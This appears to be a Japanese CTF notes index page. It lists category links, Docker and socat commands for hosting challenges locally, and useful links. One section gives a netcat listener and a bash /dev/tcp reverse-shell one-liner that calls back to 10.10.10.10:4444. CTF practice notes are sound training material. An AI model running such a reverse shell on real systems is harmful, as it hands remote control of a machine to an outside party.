# CTF

- [CTF](ctf)
- [Pwn](pwn)
- [Rev](rev)
- [Crypto](crypto)
- [Web](web)
- [Forensics](for)

## Docker で試す

```zsh
$ sudo docker-compose up -d


$ sudo docker-compose down --rmi all
```

## Socket で試す

```zsh
socat tcp-l:4444,reuseaddr,fork exec:'bash ./chall.sh'
```

## netcat でリバースシェル

**LOCAL**
```zsh
nc -nvlp 4444
```

**REMOTE**
```zsh
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

## Links

- https://www.onlinegdb.com/online_python_compiler
- https://webhook.site/
  - [Webbook.site - JavaScript, X integration, Custom Actions, Schedules - YouTube](https://www.youtube.com/watch?v=wg08ny5bh9w) 
  - [Webhookのデバッグに便利なツール「Webhook.site」の紹介 | SendGridブログ](https://sendgrid.kke.co.jp/blog/?p=11340)
